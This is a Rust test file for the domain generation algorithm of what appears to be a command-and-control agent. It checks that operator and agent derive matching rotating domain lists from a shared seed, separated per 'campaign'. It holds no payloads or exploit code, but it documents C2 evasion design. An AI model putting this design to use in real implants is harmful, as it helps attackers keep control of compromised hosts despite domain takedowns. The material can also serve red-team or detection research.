// tests/test_dga.rs — Integration tests for the Domain Generation Algorithm.
//
// Black-box tests over the public DGA API: domain generation, endpoint
// building, and the full FallbackManager integration path.
// The DGA is the agent's resilience mechanism for reaching the C2 server:
// both the operator and the agent compute the same domain list from a shared
// seed, so the operator can pre-register domains before the agent needs them.

use rcm::agent::dga::{generate_domain, generate_endpoints, current_window};
use rcm::common::{DgaConfig, TransportProtocol};

const TLDS: &[&str] = &["com", "net", "org", "io"];

fn dga(seed: u64, count: u32) -> DgaConfig {
    DgaConfig {
        seed,
        window_secs: 86400,
        count,
        tlds: TLDS.iter().map(|s| s.to_string()).collect(),
        max_failures_per_domain: 3,
    }
}

// ── Determinism ───────────────────────────────────────────────────────────────

#[test]
fn same_inputs_same_domain() {
    assert_eq!(
        generate_domain(12345, 7, 0, TLDS),
        generate_domain(12345, 7, 0, TLDS),
    );
}

#[test]
fn same_seed_same_window_produces_identical_sets() {
    let d1: Vec<_> = (0..20).map(|i| generate_domain(99, 3, i, TLDS)).collect();
    let d2: Vec<_> = (0..20).map(|i| generate_domain(99, 3, i, TLDS)).collect();
    assert_eq!(d1, d2);
}

// ── Domain format ─────────────────────────────────────────────────────────────

#[test]
fn domain_is_hostname_dot_tld() {
    for i in 0..30 {
        let d = generate_domain(0xABCD, 5, i, TLDS);
        let parts: Vec<&str> = d.splitn(2, '.').collect();
        assert_eq!(parts.len(), 2, "domain '{d}' should have exactly one dot");
        assert!(!parts[0].is_empty(), "label before dot must not be empty");
        assert!(!parts[1].is_empty(), "TLD must not be empty");
    }
}

#[test]
fn label_contains_only_lowercase_letters() {
    for i in 0..50 {
        let d = generate_domain(0x1234_5678, 1, i, TLDS);
        let label = d.split('.').next().unwrap();
        assert!(label.chars().all(|c| c.is_ascii_lowercase()),
            "label '{label}' in '{d}' has non-lowercase chars");
    }
}

#[test]
fn tld_always_from_configured_list() {
    for i in 0..100 {
        let d = generate_domain(0xDEAD, 42, i, TLDS);
        let tld = d.split('.').last().unwrap();
        assert!(TLDS.contains(&tld), "unexpected TLD '{tld}' in '{d}'");
    }
}

#[test]
fn label_length_within_reasonable_bounds() {
    // 2 syllables × 2 chars each = 4 minimum; 4 syllables × 3 chars = 12 maximum
    for i in 0..100 {
        let d = generate_domain(0xC0DE, 7, i, TLDS);
        let len = d.split('.').next().unwrap().len();
        assert!((4..=12).contains(&len),
            "label length {len} out of [4,12] for '{d}'");
    }
}

// ── Seed isolation ────────────────────────────────────────────────────────────

#[test]
fn different_seeds_diverge_immediately() {
    for window in [0, 1, 100, 99999] {
        let d1 = generate_domain(1, window, 0, TLDS);
        let d2 = generate_domain(2, window, 0, TLDS);
        assert_ne!(d1, d2, "seeds 1 and 2 should not produce same domain at window {window}");
    }
}

#[test]
fn campaign_isolation_across_seeds() {
    // Two campaigns (seeds) generate non-overlapping sets of 50 domains
    let set1: std::collections::HashSet<_> =
        (0..50).map(|i| generate_domain(1_000_000, 0, i, TLDS)).collect();
    let set2: std::collections::HashSet<_> =
        (0..50).map(|i| generate_domain(2_000_000, 0, i, TLDS)).collect();
    let overlap = set1.intersection(&set2).count();
    // Statistical expectation: ~0 overlaps from 50 domains each out of a huge space
    assert!(overlap < 3,
        "{overlap} domains overlap between campaigns — seed isolation too weak");
}

// ── Window rotation ───────────────────────────────────────────────────────────

#[test]
fn adjacent_windows_produce_different_domains() {
    for i in 0..20 {
        let d0 = generate_domain(7777, 100, i, TLDS);
        let d1 = generate_domain(7777, 101, i, TLDS);
        if d0 != d1 { return; } // At least one pair differs — test passes
    }
    panic!("adjacent windows produced identical domain sets for all 20 indices");
}

#[test]
fn window_is_time_based_and_advances() {
    let secs_per_day = 86400u64;
    // Anchor to the start of a window so the 1h check is unconditionally safe.
    let any_epoch  = 1_700_000_000u64;
    let day_start  = (any_epoch / secs_per_day) * secs_per_day;
    // 1h after window start is still within the same window
    assert_eq!(day_start / secs_per_day, (day_start + 3600) / secs_per_day,
        "1h after window start should be same window");
    // 25h later is always in the next window
    assert_ne!(day_start / secs_per_day, (day_start + 90000) / secs_per_day,
        "25h apart should be different windows");
}

#[test]
fn current_window_advances_with_time() {
    // current_window(1) with 1-second windows changes every second — we just
    // verify it returns a non-zero value (we can't advance time in tests).
    let w = current_window(86400);
    assert!(w > 0, "current window should be non-zero for any real timestamp");
}

// ── Uniqueness within a window ────────────────────────────────────────────────

#[test]
fn domains_unique_within_window() {
    let domains: Vec<_> = (0..200).map(|i| generate_domain(42, 0, i, TLDS)).collect();
    let unique: std::collections::HashSet<_> = domains.iter().collect();
    assert_eq!(unique.len(), 200,
        "DGA produced {} duplicate(s) in 200 domains", 200 - unique.len());
}

// ── generate_endpoints ────────────────────────────────────────────────────────

#[test]
fn endpoint_count_matches_config() {
    let cfg = dga(1, 15);
    let eps = generate_endpoints(&cfg, 0, 4443, &TransportProtocol::Tls);
    assert_eq!(eps.len(), 15);
}

#[test]
fn endpoints_have_configured_port() {
    let cfg = dga(1, 5);
    let eps = generate_endpoints(&cfg, 0, 8443, &TransportProtocol::Tls);
    assert!(eps.iter().all(|e| e.port == 8443));
}

#[test]
fn endpoints_have_configured_transport() {
    let cfg = dga(1, 3);
    let eps = generate_endpoints(&cfg, 0, 443, &TransportProtocol::Https);
    assert!(eps.iter().all(|e| e.transport == TransportProtocol::Https));
}

#[test]
fn endpoint_hostnames_are_unique() {
    let cfg = dga(42, 100);
    let eps = generate_endpoints(&cfg, 7, 4443, &TransportProtocol::Tls);
    let hosts: std::collections::HashSet<_> = eps.iter().map(|e| &e.host).collect();
    assert_eq!(hosts.len(), 100);
}

#[test]
fn endpoints_have_low_priority_for_fallback_ordering() {
    // DGA endpoints must not override statically configured endpoints
    let cfg = dga(1, 10);
    let eps = generate_endpoints(&cfg, 0, 4443, &TransportProtocol::Tls);
    assert!(eps.iter().all(|e| e.priority >= 100),
        "all DGA endpoints must have priority >= 100");
}

#[test]
fn window_rotation_changes_endpoint_hosts() {
    let cfg = dga(0xBEEF, 20);
    let w0: Vec<_> = generate_endpoints(&cfg, 0, 443, &TransportProtocol::Tls)
        .into_iter().map(|e| e.host).collect();
    let w1: Vec<_> = generate_endpoints(&cfg, 1, 443, &TransportProtocol::Tls)
        .into_iter().map(|e| e.host).collect();
    assert!(w0.iter().zip(w1.iter()).any(|(a, b)| a != b),
        "endpoints must differ between adjacent windows");
}

#[test]
fn endpoint_hosts_end_with_configured_tlds() {
    let cfg = DgaConfig {
        seed: 123, window_secs: 86400, count: 50,
        tlds: vec!["example".into()],
        max_failures_per_domain: 3,
    };
    let eps = generate_endpoints(&cfg, 0, 443, &TransportProtocol::Tls);
    assert!(eps.iter().all(|e| e.host.ends_with(".example")),
        "all endpoints must end with .example when only that TLD is configured");
}

#[test]
fn zero_count_produces_no_endpoints() {
    let cfg = DgaConfig {
        seed: 1, window_secs: 86400, count: 0,
        tlds: vec!["com".into()], max_failures_per_domain: 3,
    };
    let eps = generate_endpoints(&cfg, 0, 443, &TransportProtocol::Tls);
    assert!(eps.is_empty());
}
